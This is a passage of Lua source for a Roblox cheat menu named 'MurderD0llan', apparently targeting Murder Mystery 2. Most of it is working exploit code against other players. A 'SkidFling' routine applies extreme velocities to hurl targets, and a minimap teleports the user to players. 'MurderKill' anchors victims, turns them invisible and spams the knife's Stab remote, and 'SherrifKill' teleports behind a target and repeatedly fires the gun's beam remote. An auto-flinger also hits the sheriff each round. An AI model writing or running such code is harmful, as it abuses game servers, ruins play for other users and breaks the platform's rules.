				soundOnOpen = Notificaciones.Aviso,
				theme = "Warning"
			})
		end

		-- Botones UI
		local NotifyWhenYourFriendIsKilled = script.Parent.notifywhenyourfriendiskilled
		local NotifyWhenSheriffIsKilled = script.Parent.notifywhensherrifiskilled
		local NotifyWhenAPlayerIsKilled = script.Parent.notifywhenaplayeriskilled

		-- Frames
		local FrameFriend = NotifyWhenYourFriendIsKilled:WaitForChild("Frame")
		local FrameSheriff = NotifyWhenSheriffIsKilled:WaitForChild("Frame")
		local FrameAnyPlayer = NotifyWhenAPlayerIsKilled:WaitForChild("Frame")

		-- Estados
		local IsActiveFriend = false
		local IsActiveSheriff = false
		local IsActiveAnyPlayer = false

		-- Utils
		local function SetFrameColor(frame, active)
			frame.BackgroundColor3 = active and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
		end

		-- Registro de conexiones por jugador
		local humanoidConnections = {}

		-- Determina si un jugador es tu amigo
		local function isFriend(player)
			local success, result = pcall(function()
				return localplayer:IsFriendsWith(player.UserId)
			end)
			return success and result
		end

		-- Determina si un jugador tiene un arma (gun)
		local function isSheriff(player)
			if player.Backpack:FindFirstChild("Gun") then return true end
			local char = player.Character
			if char and char:FindFirstChild("Gun") then return true end
			return false
		end

		-- Configura monitoreo de muerte para cada jugador
		local function monitorPlayer(player)
			if player == localplayer then return end

			local function setup()
				if humanoidConnections[player] then
					humanoidConnections[player]:Disconnect()
					humanoidConnections[player] = nil
				end

				local char = player.Character
				if not char then return end

				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoidConnections[player] = humanoid.Died:Connect(function()
						if IsActiveAnyPlayer then
							warningnotify(player.DisplayName .. " has been killed.")
						end
						if IsActiveFriend and isFriend(player) then
							warningnotify(player.DisplayName .. " (your friend) has been killed.")
						end
						if IsActiveSheriff and isSheriff(player) then
							warningnotify("The sheriff (" .. player.DisplayName .. ") has been killed.")
						end
					end)
				end
			end

			setup()
			player.CharacterAdded:Connect(function()
				task.wait(1)
				setup()
			end)
		end

		-- Inicia monitoreo para jugadores actuales
		for _, plr in ipairs(Players:GetPlayers()) do
			monitorPlayer(plr)
		end

		-- Monitorea nuevos jugadores que entren
		Players.PlayerAdded:Connect(monitorPlayer)

		-- Botón: Amigo
		NotifyWhenYourFriendIsKilled.MouseButton1Click:Connect(function()
			IsActiveFriend = not IsActiveFriend
			SetFrameColor(FrameFriend, IsActiveFriend)

			if IsActiveFriend then
				sucessnotify("Friend death notification ENABLED")
			else
				errornotify("Friend death notification DISABLED")
			end
		end)

		-- Botón: Sheriff
		NotifyWhenSheriffIsKilled.MouseButton1Click:Connect(function()
			IsActiveSheriff = not IsActiveSheriff
			SetFrameColor(FrameSheriff, IsActiveSheriff)

			if IsActiveSheriff then
				sucessnotify("Sheriff death notification ENABLED")
			else
				errornotify("Sheriff death notification DISABLED")
			end
		end)

		-- Botón: Cualquier jugador
		NotifyWhenAPlayerIsKilled.MouseButton1Click:Connect(function()
			IsActiveAnyPlayer = not IsActiveAnyPlayer
			SetFrameColor(FrameAnyPlayer, IsActiveAnyPlayer)

			if IsActiveAnyPlayer then
				sucessnotify("Any player death notification ENABLED")
			else
				errornotify("Any player death notification DISABLED")
			end
		end)

	end)


	--------------------------
	local Players = game:GetService("Players")
	local localplayer = Players.LocalPlayer

	local DodgeModule = require(script.Parent.Parent.Parent.Parent.HelpModules.DodgeModule)

	local IsActiveTTDM = false
	local TryToDodgeMurderer = script.Parent:FindFirstChild("TryToDodgeMurderer")

	local isDodging = false

	-- Cambia el color del botón para indicar el estado actual
	local function updateButtonVisual(state)
		if TryToDodgeMurderer and TryToDodgeMurderer:FindFirstChild("Frame") then
			TryToDodgeMurderer.Frame.BackgroundColor3 = state and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
		end
	end

	-- Inicia o detiene la evasión dependiendo del estado actual
	local function tryStartDodge()
		local murderer = Help_Functions.findMurderer()
		if murderer and murderer ~= localplayer then
			if not isDodging then
				print("[DodgeSystem] Esquivando al asesino:", murderer.Name)
				DodgeModule.StartDodging(murderer)
				isDodging = true
			end
		else
			if isDodging then
				print("[DodgeSystem] Asesino no detectado. Evasión desactivada.")
				DodgeModule.StopDodging()
				isDodging = false
			end
		end
	end

	-- Bucle principal para evasión automática (chequea cada 0.5s)
	task.spawn(function()
		while true do
			if IsActiveTTDM then
				pcall(tryStartDodge)
			end
			task.wait(1)
		end
	end)

	-- Evento para activar/desactivar desde botón UI
	if TryToDodgeMurderer  then
		TryToDodgeMurderer.MouseButton1Click:Connect(function()
			IsActiveTTDM = not IsActiveTTDM
			updateButtonVisual(IsActiveTTDM)

			if IsActiveTTDM then
				print("[DodgeSystem] Modo evasión activado.")
			else
				print("[DodgeSystem] Modo evasión desactivado.")
				if isDodging then
					DodgeModule.StopDodging()
					isDodging = false
				end
			end

			tryStartDodge()
		end)
	else
		warn("[DodgeSystem] Botón 'TryToDodgeMurderer' no encontrado o inválido.")
	end



	---------------------------

	local function SkidFling(TargetPlayer)
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		if not TargetPlayer or not TargetPlayer.Character then
			errornotify("Target player is invalid or has no character.")
			return
		end

		print("skidfling was executed")
		local TCharacter = TargetPlayer.Character
		local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		local TRootPart = THumanoid and THumanoid.RootPart
		local THead = TCharacter:FindFirstChild("Head")
		local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		local Handle = Accessory and Accessory:FindFirstChild("Handle")

		if not Character or not Humanoid or not RootPart then
			errornotify("Your character is not fully loaded.")
			return
		end

		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
			errornotify("Target player has no BasePart.")
			return
		end

		sucessnotify("Fling started on target: " .. TargetPlayer.Name)

		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end

		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end

		local function FPos(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end

		local function SFBasePart(BasePart)
			local TimeToWait = 2
			local Time = tick()
			local Angle = 0

			repeat
				if RootPart and THumanoid then
					if BasePart.Velocity.Magnitude < 50 then
						Angle = Angle + 100

						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
					else
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
					end
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
		end

		workspace.FallenPartsDestroyHeight = 0/0

		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

		if TRootPart and THead then
			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
				SFBasePart(THead)
			else
				SFBasePart(TRootPart)
			end
		elseif TRootPart then
			SFBasePart(TRootPart)
		elseif THead then
			SFBasePart(THead)
		elseif Handle then
			SFBasePart(Handle)
		else
			errornotify("No valid fling target part found.")
		end

		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid

		repeat
			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
			Humanoid:ChangeState("GettingUp")
			for _, x in ipairs(Character:GetChildren()) do
				if x:IsA("BasePart") then
					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
				end
			end
			task.wait()
		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

		workspace.FallenPartsDestroyHeight = getgenv().FPDH

		sucessnotify("Fling finished successfully.")
	end

	local TryToBeSherrifInEveryRoundButton = script.Parent.trytobesheriff

	local TTBSIERBActive = false

	local TTBSIERBFrameBGC3 = TryToBeSherrifInEveryRoundButton.Frame

	local TTBSIERBConnection

	TryToBeSherrifInEveryRoundButton.MouseButton1Click:Connect(function()
		if not TTBSIERBActive then
			TTBSIERBActive = true
			TTBSIERBFrameBGC3.BackgroundColor3 = Color3.new(0, 1, 0)
			TTBSIERBConnection = game:GetService("Workspace").ChildAdded:Connect(function(child)
				if child:FindFirstChild("CoinContainer") and child:FindFirstChild("Spawns") then
					task.delay(15, function()
						SkidFling(Help_Functions.findSheriff())
						wait(5)

					end)
				end
			end)
		else
			TTBSIERBActive = false
			TTBSIERBFrameBGC3.BackgroundColor3 = Color3.new(1, 0, 0)
			if TTBSIERBConnection then
				TTBSIERBConnection:Disconnect()
				TTBSIERBConnection = nil
			end
		end
	end)
end;
task.spawn(C_190);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_FrameBox.Box.MiniMap2DSimulation
local function C_1c1()
	local script = G2L["1c1"];
	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local GuiService = game:GetService("GuiService")

	local localPlayer = Players.LocalPlayer

	local frame = script.Parent
	local parentFrame = frame.Parent

	local testing = false

	-- Configuración del minimapa
	local PLAYER_SIZE = 8
	local ENEMY_SIZE = 8

	local COLOR_PLAYER = Color3.fromRGB(0, 255, 0)
	local COLOR_ENEMY = Color3.fromRGB(255, 50, 50)

	-- Variables de control
	local enableTeleportation = true

	script.Parent.Parent.TOC.MouseButton1Click:Connect(function()
		enableTeleportation = not enableTeleportation
		if enableTeleportation  then
			script.Parent.Parent.TOC.TextColor3 = Color3.fromRGB(0, 255, 0)
		else
			script.Parent.Parent.TOC.TextColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)
	local SelectedEnemy = nil

	-- Crear minimapa si no existe y ajustarlo al tamaño y posición del frame "frame"
	local miniMap = frame:FindFirstChild("MiniMap2D") or Instance.new("Frame")
	if frame and not miniMap:IsDescendantOf(frame) then
		miniMap.Name = "MiniMap2D"
		miniMap.Size = frame.Size
		miniMap.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		miniMap.BorderSizePixel = 1
		miniMap.ClipsDescendants = true
		miniMap.Parent = frame
	end

	-- Limpia los puntos en el minimapa
	local function clearMiniMap()
		for _, child in miniMap:GetChildren() do
			if child:IsA("Frame") or child:IsA("TextLabel") then
				child:Destroy()
			end
		end
	end

	-- Convierte posición 3D a 2D en el minimapa
	local function worldToMiniMap(pos, origin, scale)
		local sizeX, sizeY = miniMap.AbsoluteSize.X, miniMap.AbsoluteSize.Y
		local offset = pos - origin
		return offset.X * scale + sizeX / 2, -offset.Z * scale + sizeY / 2
	end

	-- Convierte posición 2D a posición 3D en el mundo
	local function miniMapToWorld(clickX, clickY, origin, scale)
		local sizeX, sizeY = miniMap.AbsoluteSize.X, miniMap.AbsoluteSize.Y
		local dx = (clickX - sizeX / 2) / scale
		local dz = -(clickY - sizeY / 2) / scale
		return Vector3.new(origin.X + dx, origin.Y, origin.Z + dz)
	end

	-- Dibuja un punto en el minimapa
	local function drawPoint(x, y, size, color)
		local point = Instance.new("Frame")
		point.Size = UDim2.new(0, size, 0, size)
		point.Position = UDim2.new(0, x - size / 2, 0, y - size / 2)
		point.BackgroundColor3 = color
		point.BorderSizePixel = 0
		point.BackgroundTransparency = 0
		point.ZIndex = 1
		point.Parent = miniMap
		return point
	end

	-- Agrega nombre arriba del enemigo
	local function addNameLabel(name, x, y)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(0, 60, 0, 12)
		label.Position = UDim2.new(0, x - 30, 0, y - ENEMY_SIZE / 2 - 12)
		label.BackgroundTransparency = 1
		label.Text = name
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextTransparency = 0.4
		label.TextScaled = true
		label.Font = Enum.Font.ArialBold
		label.ZIndex = 2
		label.Parent = miniMap
	end

	-- Obtener enemigos cercanos por distancia
	local function getNearbyEnemies(origin, maxDist)
		local enemyData = {}
		for _, player in Players:GetPlayers() do
			if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local pos = player.Character.HumanoidRootPart.Position
				if (pos - origin).Magnitude <= maxDist then
					table.insert(enemyData, {Player = player, Position = pos})
				end
			end
		end
		return enemyData
	end

	-- Manejo de clics sobre el minimapa
	miniMap.InputBegan:Connect(function(input)
		if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.MouseButton2 then return end

		local character = localPlayer.Character
		local hrp = character and character:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		local scale = 0.5
		local mousePos = UserInputService:GetMouseLocation() - GuiService:GetGuiInset()
		local relPos = mousePos - miniMap.AbsolutePosition
		local sizeX, sizeY = miniMap.AbsoluteSize.X, miniMap.AbsoluteSize.Y

		if relPos.X < 0 or relPos.X > sizeX or relPos.Y < 0 or relPos.Y > sizeY then return end

		local origin = hrp.Position
		local clickedWorldPos = miniMapToWorld(relPos.X, relPos.Y, origin, scale)

		-- Buscar si se clickeó un enemigo
		for _, enemyInfo in pairs(getNearbyEnemies(origin, 200)) do
			local x, y = worldToMiniMap(enemyInfo.Position, origin, scale)
			local dist = (Vector2.new(x, y) - relPos).Magnitude
			if dist <= ENEMY_SIZE then
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					SelectedEnemy = enemyInfo.Player
					warn("Enemigo seleccionado: " .. SelectedEnemy.Name)
				elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
					hrp.CFrame = CFrame.new(enemyInfo.Position + Vector3.new(0, 3, 0))
					warn("Teletransportado a: " .. enemyInfo.Player.Name)
				end
				return
			end
		end

		-- Teletransporte libre si está habilitado
		if input.UserInputType == Enum.UserInputType.MouseButton1 and enableTeleportation then
			hrp.CFrame = CFrame.new(clickedWorldPos)
		end
	end)

	local HeartBeat = nil
	-- Actualización del minimapa en tiempo real
	script.Parent.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
		if script.Parent.Parent.Visible then
			HeartBeat =	RunService.Heartbeat:Connect(function()
				if not parentFrame.Visible then return end

				local character = localPlayer.Character
				local hrp = character and character:FindFirstChild("HumanoidRootPart")
				if not hrp then return end

				local scale = 0.5
				local origin = hrp.Position
				local sizeX, sizeY = miniMap.AbsoluteSize.X, miniMap.AbsoluteSize.Y

				clearMiniMap()
				drawPoint(sizeX / 2, sizeY / 2, PLAYER_SIZE, COLOR_PLAYER)

				for _, enemyInfo in pairs(getNearbyEnemies(origin, 200)) do
					local x, y = worldToMiniMap(enemyInfo.Position, origin, scale)
					drawPoint(x, y, ENEMY_SIZE, COLOR_ENEMY)
					addNameLabel(enemyInfo.Player.Name, x, y)
				end
			end)
		else
			if HeartBeat then
				HeartBeat:Disconnect()
				HeartBeat = nil
			end
		end
	end)

	local AllBool = false
	local SkidFling = function(TargetPlayer)
		local Character = game.Players.LocalPlayer.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		local TCharacter = TargetPlayer.Character
		local THumanoid
		local TRootPart
		local THead
		local Accessory
		local Handle

		if TCharacter:FindFirstChildOfClass("Humanoid") then
			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		end
		if THumanoid and THumanoid.RootPart then
			TRootPart = THumanoid.RootPart
		end
		if TCharacter:FindFirstChild("Head") then
			THead = TCharacter.Head
		end
		if TCharacter:FindFirstChildOfClass("Accessory") then
			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		end
		if Accessoy and Accessory:FindFirstChild("Handle") then
			Handle = Accessory.Handle
		end

		if Character and Humanoid and RootPart then
			if RootPart.Velocity.Magnitude < 50 then
				getgenv().OldPos = RootPart.CFrame
			end
			if THumanoid and THumanoid.Sit and not AllBool then
			end
			if THead then
				workspace.CurrentCamera.CameraSubject = THead
			elseif not THead and Handle then
				workspace.CurrentCamera.CameraSubject = Handle
			elseif THumanoid and TRootPart then
				workspace.CurrentCamera.CameraSubject = THumanoid
			end
			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
				return
			end

			local FPos = function(BasePart, Pos, Ang)
				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			end

			local SFBasePart = function(BasePart)
				local TimeToWait = 2
				local Time = tick()
				local Angle = 0

				repeat
					if RootPart and THumanoid then
						if BasePart.Velocity.Magnitude < 50 then
							Angle = Angle + 100

							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
						else
							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()
						end
					else
						break
					end
				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
			end

			workspace.FallenPartsDestroyHeight = 0/0

			local BV = Instance.new("BodyVelocity")
			BV.Name = "EpixVel"
			BV.Parent = RootPart
			BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
			BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

			if TRootPart and THead then
				if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
					SFBasePart(THead)
				else
					SFBasePart(TRootPart)
				end
			elseif TRootPart and not THead then
				SFBasePart(TRootPart)
			elseif not TRootPart and THead then
				SFBasePart(THead)
			elseif not TRootPart and not THead and Accessory and Handle then
				SFBasePart(Handle)
			else
			end

			BV:Destroy()
			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			workspace.CurrentCamera.CameraSubject = Humanoid

			repeat
				RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
				Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
				Humanoid:ChangeState("GettingUp")
				table.foreach(Character:GetChildren(), function(_, x)
					if x:IsA("BasePart") then
						x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
					end
				end)
				task.wait()
			until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
			workspace.FallenPartsDestroyHeight = getgenv().FPDH
		else
		end
	end

	local FlingTargetButton = script.Parent.Parent.F
	local KillTargetButton = script.Parent.Parent.K
	FlingTargetButton.MouseButton1Click:Connect(function()
		if SelectedEnemy then
			local character = SelectedEnemy.Character
			if character then
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart then
					SkidFling(SelectedEnemy)
				end
			end
		end
	end)

	local Players = game:GetService("Players")

	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}


	local Notification_Service = require(script.Parent.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end
	local Players = game:GetService("Players")
	local function MurderKill(targetPlayer: Player)
		local localPlayer = Players.LocalPlayer
		if not (targetPlayer and localPlayer) then return end

		local targetChar = targetPlayer.Character
		local localChar = localPlayer.Character
		if not (targetChar and localChar) then return end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		local localHRP = localChar:FindFirstChild("HumanoidRootPart")
		if not (targetHRP and localHRP) then return end

		local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
		if not targetHumanoid then return end

		-- Buscar el cuchillo en el character o en la mochila
		local knife = localChar:FindFirstChild("Knife") or localPlayer.Backpack:FindFirstChild("Knife")

		if not knife then
			warn("[Kill] No se encontró el cuchillo.")
			return
		end

		-- Si el cuchillo está en la mochila, equiparlo
		if knife.Parent == localPlayer.Backpack then
			local localHum = localChar:FindFirstChildOfClass("Humanoid")
			if localHum then
				localHum:EquipTool(knife)
			end
			task.wait(0.1) -- Esperar a que se equipe correctamente
		end

		local stabEvent = knife:FindFirstChild("Stab")
		if not (stabEvent and stabEvent:IsA("RemoteEvent")) then
			warn("[Kill] El cuchillo no tiene un RemoteEvent llamado 'Stab'.")
			return
		end

		-- Teletransportar y ocultar al objetivo
		targetHRP.Anchored = true
		targetHRP.CFrame = localHRP.CFrame + localHRP.CFrame.LookVector

		for _, part in ipairs(targetChar:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Transparency = 1
			end
		end

		-- Atacar repetidamente hasta que la salud del objetivo llegue a 0
		repeat
			stabEvent:FireServer("Slash")
			task.wait(0.1)
		until targetHumanoid.Health <= 0 or not targetHumanoid.Parent

		-- Desequipar el cuchillo
		if knife and knife.Parent == localChar then
			local localHum = localChar:FindFirstChildOfClass("Humanoid")
			if localHum then
				localHum:UnequipTools()
			end
		end

		print("[Kill] Objetivo eliminado:", targetPlayer.Name)
	end


	local shootOffset = 2.8
	local offsetToPingMult = 1


	local function PredictShootPosition(player: Player, shootOffset: number)
		pcall(function()
			player = player.Character
			if not player.Character then errornotify("Invalid Args (player is NIL)") return end
		end)
		local localplayer = game:GetService("Players").LocalPlayer
		local playerHRP = player:FindFirstChild("UpperTorso")
		local playerHum = player:FindFirstChild("Humanoid")
		if not playerHRP or not playerHum then
			errornotify("Invalid Args (player's HumanoidRootPart = NIL)")
			return nil
		end

		local playerPosition = playerHRP.Position
		local velocity = Vector3.new()
		velocity = playerHRP.AssemblyLinearVelocity
		local playerMoveDirection = playerHum.MoveDirection
		local playerLookVec = playerHRP.CFrame.LookVector
		local yVelFactor = velocity.Y > 0 and -1 or 0.5
		local predictedPosition
		predictedPosition = playerHRP.Position + ((velocity * Vector3.new(0, 0.5, 0))) * (shootOffset / 15) +playerMoveDirection * shootOffset
		predictedPosition = predictedPosition * (((localplayer:GetNetworkPing() * 1000) * ((offsetToPingMult - 1) * 0.01)) + 1)
		-- failed so hard i had to revert back to v1.11 :sob:

		--predictedPosition = Vector3.new(predictedPositiomurdererHRP.Position + ((murdererVelocity * Vector3.new(0, 0.5, 0))) * (shootOffset / 15) + murderer.Character.Humanoid.MoveDirection * shootOffsetn.X, math.clamp(predictedPosition.Y, playerPosition.Y - 2, playerPosition.Y + 2), predictedPosition.Z)


		return predictedPosition
	end


	local localPlayer = game:GetService("Players").LocalPlayer
	local function Shoot(targetPlayer: Player)
		local targetChar = targetPlayer.Character
		if not targetChar then return end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then return end

		local predictedPosition = targetHRP.Position + shootOffset

		local gun = localPlayer.Character and localPlayer.Character:FindFirstChild("Gun")
		if not gun then return end

		local createBeamRF = gun:FindFirstChild("KnifeLocal") and gun.KnifeLocal:FindFirstChild("CreateBeam")
		if not (createBeamRF and createBeamRF:IsA("RemoteFunction")) then
			errornotify("Missing 'CreateBeam' RemoteFunction.")
			return
		end

		local args = {
			[1] = 1,
			[2] = predictedPosition,
			[3] = "AH2"
		}

		createBeamRF:InvokeServer(unpack(args))
	end

	local function SherrifKill(targetPlayer: Player)
		if not (targetPlayer and targetPlayer.Character) then 
			errornotify("Invalid target player or missing character.")
			return 
		end

		local localChar = localPlayer.Character
		local humanoid = localChar and localChar:FindFirstChildWhichIsA("Humanoid")
		if not humanoid then 
			errornotify("Local player's humanoid not found.")
			return 
		end

		local gun = localPlayer.Backpack:FindFirstChild("Gun") or localChar:FindFirstChild("Gun")
		if not gun then
			errornotify("No gun named 'Gun' found in inventory or character.")
			return
		end

		-- Equip the gun
		if gun.Parent == localPlayer.Backpack then
			humanoid:EquipTool(gun)
			task.wait(0.1)
		end

		local originalCFrame = localChar:GetPivot()

		-- Teleport behind the target
		local targetChar = targetPlayer.Character
		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then
			errornotify("Target's HumanoidRootPart not found.")
			return
		end

		local backPosition = targetHRP.CFrame * CFrame.new(0, 0, 3)
		localChar:PivotTo(backPosition)

		-- Repeatedly shoot for up to 15 seconds or until target is dead
		local startTime = tick()
		local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")

		if not targetHumanoid then
			errornotify("Target's Humanoid not found.")
			return
		end


		task.spawn(function()
			while targetHumanoid.Health > 0 and tick() - startTime <= 15 do
				Shoot(targetPlayer)
				task.wait(0.2)
			end

		end)
		if targetHumanoid.Health <= 0 then
			sucessnotify("Target eliminated successfully.")
		else
			warningnotify("Timeout: Target wasn't killed within 15 seconds.")
		end

		-- Unequip the gun
		humanoid:UnequipTools()
		task.wait(0.1)

		-- Return to original position
		localChar:PivotTo(originalCFrame)
	end


	local function findMurderer()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("knife") then
				return i
			end
		end

		return nil
	end

	local function findSheriff()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Gun") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Gun") then
				return i
			end
		end



		return nil
	end

	KillTargetButton.MouseButton1Click:Connect(function()
		if SelectedEnemy then
			local character = SelectedEnemy.Character
			if character then
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
